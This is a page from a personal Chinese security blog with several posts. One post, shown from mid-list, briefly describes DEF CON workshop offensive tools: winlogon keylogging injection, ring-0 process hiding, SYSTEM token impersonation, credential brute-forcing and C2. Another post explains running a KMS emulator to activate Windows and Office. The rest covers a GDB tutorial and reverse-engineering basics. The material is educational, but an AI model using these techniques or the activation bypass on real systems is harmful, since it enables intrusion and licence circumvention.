            <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这个项目还是比较有意义的，里面会有一些值得借鉴的函数，比网上现找的质量好些。</div></pre></td></tr></table></figure>
<ul>
<li><p>11.locklogger - injects into winlogon.exe and keylogs  注入winlogon.exe以及键盘记录<br>dll注入winlogon并进行键盘记录，这里的关键点应该是dll注入winlogon进程<br><a href="http://blog.csdn.net/suppercoder/article/details/17167537" target="_blank" rel="external">关于win7的session0隔离的总结</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">使用OutputDebugStringA()函数可以将调试信息输出，然后用debugview工具进行查看。</div><div class="line">ANSI的ASCII字符集及其派生字符集（也称多字节字符集）比较旧，Unicode字符集比较新，固定以双字节表示一个字。</div><div class="line">操作字符串的API在声明时，会指定字符集。每个含有字符串的API同时有两个版本：即ANSI，Unicode。尾部带A的API是ANSI版本，带W的API是Unicode版本。例如：SetWindowTextA，是ANSI函数；而SetWindowTextW，是Unicode函数.</div><div class="line">_tmain()是unicode版本的的main()</div><div class="line">VS注释与取消注释快捷键</div><div class="line">CTRL + K , CTRL + C(注释)</div><div class="line">CTRL + K , CTRL + U(取消注释)</div></pre></td></tr></table></figure>
</li>
<li><p>12.puppetstrings - take a free ride into ring 0<br>ring0层实现进程隐藏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这个还是比较有意思的</div></pre></td></tr></table></figure>
</li>
<li><p>13.ThreadContinue - injection using SetThreadContext() and NtContinue()<br>反射型dll注入，利用SetThreadContext() and NtContinue()进行dll注入。</p>
</li>
<li><p>14.getsystem - gets system using Named Pipe impersonation<br>利用服务管理程序sc获取system权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">关于sc介绍可以看这里https://technet.microsoft.com/en-us/library/bb490995.aspx</div></pre></td></tr></table></figure>
</li>
<li><p>15.steamroll - brute forces login credentials<br><img src="/2017/08/31/defcon-25-workshop代码解读-partII/1.png" alt=""><br>爆破登录信息，代码量比较大，加入了av，之前看到过一个非常简单的爆破代码，利用的是LogonUser()函数。</p>
</li>
<li>16.combrowser - using IE COM object to make web requests<br>使用IE COM对象发送web请求</li>
<li>17.httpbrowser - using HTTP API to make web requests<br>自己实现了一个http发包的方法。</li>
<li>18.toxicserpent - log all network traffic, poison, port knock C2<br>流量日志</li>
<li>19.RunShellcode - run shellcode from .NET<br>一个run shellcode的GUI小工具 c#写的</li>
<li><p>20.offsetfix - converting static analysis offsets with ASLR</p>
</li>
<li><p>21.rawhook - simple example showing function prologue hooking</p>
</li>
<li><p>22.wmiquery - shows how to look up AV using WMI<br>使用wmi查询AV</p>
</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/26/可激活windows和office的KMS服务搭建/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/08/26/可激活windows和office的KMS服务搭建/" itemprop="url">
                  可激活windows和office的KMS服务搭建
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>碍于windows激活工具存在后门的情况，搭建一个kms服务器的方法倒是不错，也是朋友推荐的。<br>然后网上搜索了一下。<br>KMS(Key Management Service) .这个功能是在windows Vista中的Enterprise版本和Windows Server 2008中首次出现的一种新型产品激活机制，目的是为了Microsoft更好的“反盗版”。<br><a href="https://baike.baidu.com/item/KMS/66195" target="_blank" rel="external">摘自百度</a></li>
<li>github上开源了一个kms服务器的源码，<a href="https://github.com/Wind4/vlmcsd" target="_blank" rel="external">link</a><br>想深入研究原理的可以分析一下源码。<h4 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h4></li>
</ul>
<ol>
<li>一般安装在linux服务上，我的是安装在ubuntu服务器上的，安装脚本如下<br><a href="https://raw.githubusercontent.com/Wind4/vlmcsd/211e463ddd71f5df884080ce98d0fc5eb369b51f/scripts/install.sh" target="_blank" rel="external">https://raw.githubusercontent.com/Wind4/vlmcsd/211e463ddd71f5df884080ce98d0fc5eb369b51f/scripts/install.sh</a></li>
<li>安装完成后 vlmcsd -h 看一下所支持的命令<br>kms 默认的端口是1688，当然也可以自定义端口，参数是 -P</li>
<li>这个时候可以参考说明进行激活了,注意:自定义了端口的需要在host后面加上自定义的端口<br><a href="https://github.com/Wind4/vlmcsd/tree/211e463ddd71f5df884080ce98d0fc5eb369b51f" target="_blank" rel="external">https://github.com/Wind4/vlmcsd/tree/211e463ddd71f5df884080ce98d0fc5eb369b51f</a><br><a href="https://wwww.lvmoo.com/archives/517.html" target="_blank" rel="external">https://wwww.lvmoo.com/archives/517.html</a></li>
<li>注 windows7 ultimate 旗舰版 没有对应的KMS Client Setup Key,建议安全windows7 professional 专业版  </li>
</ol>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/24/linux调试工具GDB入门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/08/24/linux调试工具GDB入门/" itemprop="url">
                  linux调试工具GDB入门
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>gdb可以用在代码调试和反汇编代码的调试</p>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>调用gdb编译需要在cc后面加 -g参数再加-o；<br>[root@redhat home]#gdb 调试文件：启动gdb<br>(gdb) l ：（字母l）从第一行开始列出源码<br>(gdb) break n :在第n行处设置断点<br>(gdb) break func：在函数func()的入口处设置断点<br>(gdb) info break： 查看断点信息<br>(gdb) r：运行程序<br>(gdb) n：单步执行<br>(gdb) c：继续运行<br>(gdb) p 变量 ：打印变量的值<br>(gdb) bt：查看函数堆栈<br>(gdb) finish：退出函数<br>(gdb) shell 命令行：执行shell命令行<br>(gdb) set args 参数:指定运行时的参数<br>(gdb) show args：查看设置好的参数<br>(gdb) show paths:查看程序运行路径；<br>           set environment varname [=value] 设置环境变量。如：set env USER=hchen；<br>            show environment [varname] 查看环境变量；<br>(gdb) cd 相当于shell的cd;<br>(gdb)pwd ：显示当前所在目录<br>(gdb)info program： 来查看程序的是否在运行，进程号，被暂停的原因。<br>(gdb)clear 行号n：清除第n行的断点<br>(gdb)delete 断点号n：删除第n个断点<br>(gdb)disable 断点号n：暂停第n个断点<br>(gdb)enable 断点号n：开启第n个断点<br>(gdb)step：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</p>
<p>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。<br>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12<br>list 函数名：将显示“函数名”所在函数的源代码，如：list main<br>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。<br>注意 ：如果运行list 命令得到类似如下的打印，那是因为在编译程序时没有加入 -g 选项：<br>(gdb) list<br>1       ../sysdeps/i386/elf/start.S: No such file or directory.<br>        in ../sysdeps/i386/elf/start.S</p>
<p>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。<br>回车：重复上一条命令。<br>set args：设置运行程序时的命令行参数，如：set args 33 55<br>show args：显示命令行参数<br>continue：简讯为 c ，其作用是继续运行被断点中断的程序。<br>break：为程序设置断点。<br>break 行号：在当前文件的“行号”处设置断点，如：break  33<br>break 函数名：在用户定义的函数“函数名”处设置断点，如：break cb_button<br>info breakpoints：显示当前程序的断点设置情况<br>disable breakpoints Num：关闭断点“Num”，使其无效，其中“Num”为 info breakpoints 中显示的对应值<br>enable breakpoints Num：打开断点“Num”，使其重新生效<br>step：简记为 s ，单步跟踪程序，当遇到函数调用时，则进入此函数体（一般只进入用户自定义函数）。<br>next：简记为 n，单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。<br>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。<br>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。<br>stepi或nexti：单步跟踪一些机器指令。<br>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。<br>print a：将显示整数 a 的值<br>print ++a：将把 a 中的值加1,并显示出来<br>print name：将显示字符串 name 的值<br>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数<br>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数<br>bt：显示当前程序的函数调用堆栈。<br>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a<br>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a<br>kill：将强行终止当前正在调试的程序<br>help 命令：help 命令将显示“命令”的常用帮助信息<br>call 函数(参数)：调用“函数”，并传递“参数”，如：call  gdb_test(55)<br>layout：用于分割窗口，可以一边查看代码，一边测试：<br>layout src：显示源代码窗口<br>layout asm：显示反汇编窗口<br>layout regs：显示源代码/反汇编和CPU寄存器窗口<br>layout split：显示源代码和反汇编窗口<br>Ctrl + L：刷新窗口<br>quit：简记为 q ，退出gdb</p>
<h4 id="内存查看"><a href="#内存查看" class="headerlink" title="内存查看"></a>内存查看</h4><ul>
<li><p>可以使用 examine 命令(简写是 x)来查看内存地址中的值。x 命令的语法如下所示:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x/&lt;n/f/u&gt; &lt;addr&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>n、f、u 是可选的参数。</p>
</li>
<li>n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</li>
<li>f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是 s，如果地十是指令地址， 那么格式可以是 i。</li>
<li>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。u 参数可以用下 面的字符来代替，b 表示单字节，h 表示双字节，w 表示四字节，g 表示八字节。当我们指定了字节长度后， GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</li>
<li><addr>表示一个内存地址。</addr></li>
<li>n/f/u三个参数可以一起使用。例如:命令:x/3uh 0x54320 表示，从内存地址 0x54320 读取内容，h表示以双字节为一个单位，3 表 示三个单位，u表示按十六进制显示。</li>
<li>常用的组合例如 x/100xh  第一个x代表examine 第二个x代表hexadecimal，h代表半个word即两个字节<h4 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h4>首先我们使用gcc -g命令对代码进行编译  generates debug information to be used by GDB debugger.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/test1$ cat command.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main(int argc,char *argv[])</div><div class="line">&#123;</div><div class="line">int i;</div><div class="line">for (i=0;i&lt;argc;i++)</div><div class="line">	printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);</div><div class="line">return 0;</div><div class="line">&#125;</div><div class="line">xxx@ubuntu:~/Desktop/test1$ gcc -g command.c -o command</div><div class="line">xxx@ubuntu:~/Desktop/test1$ gdb -q ./command</div><div class="line">Reading symbols from ./command...done.</div><div class="line">gdb-peda$ l</div><div class="line">1	#include &lt;stdio.h&gt;</div><div class="line">2	int main(int argc,char *argv[])</div><div class="line">3	&#123;</div><div class="line">4	int i;</div><div class="line">5	for (i=0;i&lt;argc;i++)</div><div class="line">6		printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);</div><div class="line">7	return 0;</div><div class="line">8	&#125;</div><div class="line">gdb-peda$ b 6</div><div class="line">Breakpoint 1 at 0x400545: file command.c, line 6.</div><div class="line">gdb-peda$ run param1 param2 param3</div><div class="line">Starting program: /home/xxx/Desktop/test1/command param1 param2 param3</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x0 </div><div class="line">RBX: 0x0 </div><div class="line">RCX: 0x0 </div><div class="line">RDX: 0x7fffffffe010 --&gt; 0x7fffffffe390 (&quot;XDG_VTNR=7&quot;)</div><div class="line">RSI: 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</div><div class="line">RDI: 0x4 </div><div class="line">RBP: 0x7fffffffdf00 --&gt; 0x0 </div><div class="line">RSP: 0x7fffffffdee0 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</div><div class="line">RIP: 0x400545 (&lt;main+24&gt;:	mov    eax,DWORD PTR [rbp-0x4])</div><div class="line">R8 : 0x7ffff7dd4e80 --&gt; 0x0 </div><div class="line">R9 : 0x7ffff7dea700 (&lt;_dl_fini&gt;:	push   rbp)</div><div class="line">R10: 0x7fffffffdd90 --&gt; 0x0 </div><div class="line">R11: 0x7ffff7a32e50 (&lt;__libc_start_main&gt;:	push   r14)</div><div class="line">R12: 0x400440 (&lt;_start&gt;:	xor    ebp,ebp)</div><div class="line">R13: 0x7fffffffdfe0 --&gt; 0x4 </div><div class="line">R14: 0x0 </div><div class="line">R15: 0x0</div><div class="line">EFLAGS: 0x297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x400538 &lt;main+11&gt;:	mov    QWORD PTR [rbp-0x20],rsi</div><div class="line">   0x40053c &lt;main+15&gt;:	mov    DWORD PTR [rbp-0x4],0x0</div><div class="line">   0x400543 &lt;main+22&gt;:	jmp    0x400574 &lt;main+71&gt;</div><div class="line">=&gt; 0x400545 &lt;main+24&gt;:	mov    eax,DWORD PTR [rbp-0x4]</div><div class="line">   0x400548 &lt;main+27&gt;:	cdqe   </div><div class="line">   0x40054a &lt;main+29&gt;:	lea    rdx,[rax*8+0x0]</div><div class="line">   0x400552 &lt;main+37&gt;:	mov    rax,QWORD PTR [rbp-0x20]</div><div class="line">   0x400556 &lt;main+41&gt;:	add    rax,rdx</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffdee0 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</div><div class="line">0008| 0x7fffffffdee8 --&gt; 0x400400440 </div><div class="line">0016| 0x7fffffffdef0 --&gt; 0x7fffffffdfe0 --&gt; 0x4 </div><div class="line">0024| 0x7fffffffdef8 --&gt; 0x0 </div><div class="line">0032| 0x7fffffffdf00 --&gt; 0x0 </div><div class="line">0040| 0x7fffffffdf08 --&gt; 0x7ffff7a32f45 (&lt;__libc_start_main+245&gt;:	mov    edi,eax)</div><div class="line">0048| 0x7fffffffdf10 --&gt; 0x0 </div><div class="line">0056| 0x7fffffffdf18 --&gt; 0x7fffffffdfe8 --&gt; 0x7fffffffe35b (&quot;/home/xxx/Desktop/test1/command&quot;)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, main (argc=0x4, argv=0x7fffffffdfe8) at command.c:6</div><div class="line">6		printf(&quot;argv[%d]:%s \n&quot;,i,argv[i]);</div><div class="line">gdb-peda$ p i</div><div class="line">$1 = 0x0</div><div class="line">gdb-peda$ p argv</div><div class="line">$2 = (char **) 0x7fffffffdfe8</div><div class="line">gdb-peda$ p argc</div><div class="line">$3 = 0x4</div><div class="line">gdb-peda$</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="不定期更新"><a href="#不定期更新" class="headerlink" title="不定期更新"></a>不定期更新</h4><ul>
<li><p>查看eip的address，可以使用info frame命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ info frame</div><div class="line">Stack level 0, frame at 0xbfffeeb4:</div><div class="line"> eip = 0x42424242; saved eip = 0x0</div><div class="line"> called by frame at 0xbfffeeb8</div><div class="line"> Arglist at 0xbfffeeac, args: </div><div class="line"> Locals at 0xbfffeeac, Previous frame&apos;s sp is 0xbfffeeb4</div><div class="line"> Saved registers:</div><div class="line">  eip at 0xbfffeeb0</div></pre></td></tr></table></figure>
</li>
<li><p>查看程序存在的函数  info  func</p>
</li>
</ul>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
<li>linux 调试工具 GDB 使用教程<br><a href="http://bbs.pediy.com/thread-77746.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-77746.htm</a></li>
<li>Quick Intro to gdb<br><a href="https://www.youtube.com/watch?v=xQ0ONbt-qPs" target="_blank" rel="external">https://www.youtube.com/watch?v=xQ0ONbt-qPs</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/24/window逆向基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/08/24/window逆向基础/" itemprop="url">
                  window逆向基础
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="常见汇编指令助记"><a href="#常见汇编指令助记" class="headerlink" title="常见汇编指令助记"></a>常见汇编指令助记</h4><p>JG / JNLE：Jump when Greater / Jump when Not Less or Equal<br>JL / JNGE：Jump when Less / Jump when Not Greater or Equal<br>JGE / JNL：Jump when Greater or Equal / Jump when Not Less<br>JLE / JNG：Jump when Less or Equal / Jump when Not Greater<br>JE / JZ：Jump when Less / Jump when Zero</p>
<h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>windows操作系统兼容的CPU为小端（内存高位地址存放数据高位字节数据）方式，而UNIX操作系统所兼容的CPU大多为大端（内存高位地址存放数据低位字节数据）方式。此外，还有一个网络字节序，是指网络传输相关协议所规定的字节传输顺序，TCP/IP协议所使用的字节序为大端方式。</p>
<ul>
<li>大端模式，是指数据的高字节保存在内存的低地址中，而数据的低字节保存<br>在内存的高地址中，这样的存储模式有点儿类似于把数据 当作字符串顺序处理:<br>地址由小向大增加，而数据从高位往低位放; 这和我们的阅读 习惯一致</li>
<li>小端模式，是指数据的高字节保存在内存的高地址中，而数据的低字节保存<br>在内存的低地址中，这种存储模式将地址的高低和数据位权有效 地结合起来，<br>高地址部分权值高，低地址部分权值低<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000430: e684 6c4e 0100 1800 53ef 0100 0100 00000000440: b484 6c4e 004e ed00 0000 0000 0100 0000 </div><div class="line">在大端模式下，前32位应该这样读: e6 84 6c 4e ( 假设int占4个字节) </div><div class="line">在小端 模式下，前32位应该这样读: 4e 6c 84 b4 ( 假设int占4个字节)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="高级语言和低级语言"><a href="#高级语言和低级语言" class="headerlink" title="高级语言和低级语言"></a>高级语言和低级语言</h4><p><img src="/2017/08/24/window逆向基础/lowlevel.png" alt=""></p>
<ul>
<li>如上图所示，很好展示了低级语言、高级语言和机器码之间的联系<h4 id="windows内存布局"><a href="#windows内存布局" class="headerlink" title="windows内存布局"></a>windows内存布局</h4></li>
<li>和linux内存布局类似，windows的内存布局如下<br><img src="/2017/08/24/window逆向基础/windowsmemlayout.png" alt=""><h4 id="X86汇编基础-栈"><a href="#X86汇编基础-栈" class="headerlink" title="X86汇编基础-栈"></a>X86汇编基础-栈</h4><img src="/2017/08/24/window逆向基础/stack.png" alt=""><h4 id="pe结构"><a href="#pe结构" class="headerlink" title="pe结构"></a>pe结构</h4></li>
<li><img src="/2017/08/24/window逆向基础/peimage.png" alt=""><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li>API 函数 －－ API 绝密档案系列之一<br><a href="http://bbs.pediy.com/user-22319-1.htm" target="_blank" rel="external">http://bbs.pediy.com/user-22319-1.htm</a></li>
<li>Win32环境下函数调用的堆栈之研究<br><a href="http://bbs.pediy.com/thread-69909.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-69909.htm</a></li>
<li>汇编的学习<br><a href="http://bbs.pediy.com/user-90551-1-1.htm" target="_blank" rel="external">http://bbs.pediy.com/user-90551-1-1.htm</a><br><a href="http://bbs.pediy.com/user-202613-0-1.htm" target="_blank" rel="external">http://bbs.pediy.com/user-202613-0-1.htm</a></li>
<li>window线程<br><a href="http://bbs.pediy.com/thread-77556.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-77556.htm</a></li>
<li>C++类虚函数逆向学习总结<br><a href="http://bbs.pediy.com/thread-60538.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-60538.htm</a></li>
<li>MFC逆向初级研究<br><a href="http://bbs.pediy.com/thread-41087.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-41087.htm</a></li>
<li>驱动安全<br><a href="http://blog.csdn.net/zuishikonghuan/" target="_blank" rel="external">http://blog.csdn.net/zuishikonghuan/</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/avatar.jpg"
               alt="M0rk" />
          <p class="site-author-name" itemprop="name">M0rk</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/">
                <span class="site-state-item-count">45</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              
                <span class="site-state-item-count">4</span>
                <span class="site-state-item-name">分类</span>
              
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              
                <span class="site-state-item-count">3</span>
                <span class="site-state-item-name">标签</span>
              
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/kevien" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/TTByaw" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  Weibo
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">M0rk</span>
</div>



        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>




















  
  <script type="text/javascript" src="//jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="//fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="//jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="//velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="//velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script type="text/javascript" src="//src/utils.js?v="></script>

  <script type="text/javascript" src="//src/motion.js?v="></script>



  
  


  <script type="text/javascript" src="//src/affix.js?v="></script>

  <script type="text/javascript" src="//src/schemes/pisces.js?v="></script>



  

  


  <script type="text/javascript" src="//src/bootstrap.js?v="></script>



  


  




	





  





  





     <!-- 来必力City版安装代码 -->
     <!--
      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
        <script type="text/javascript">
         (function(d, s) {
             var j, e = d.getElementsByTagName(s)[0];

             if (typeof LivereTower === 'function') { return; }

             j = d.createElement(s);
             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
             j.async = true;

             e.parentNode.insertBefore(j, e);
         })(document, 'script');
